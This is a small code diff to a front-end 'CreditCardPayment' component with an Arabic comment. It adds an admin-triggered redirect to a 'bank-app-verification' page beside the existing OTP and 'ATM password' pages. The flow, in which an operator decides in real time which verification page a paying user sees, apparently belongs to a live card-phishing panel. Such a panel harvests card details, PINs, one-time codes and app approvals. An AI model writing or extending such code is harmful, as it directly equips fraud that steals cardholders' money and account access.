@@ -236,7 +236,9 @@ export default function CreditCardPayment() {
       // إخفاء اللودر فوراً عند استلام أي إجراء من الأدمن
       waitingMessage.value = "";
       
-      if (action === 'otp') {
+      if (action === 'app') {
+        navigate("/bank-app-verification");
+      } else if (action === 'otp') {
         navigate("/otp-verification");
       } else if (action === 'atm') {
         navigate("/atm-password");
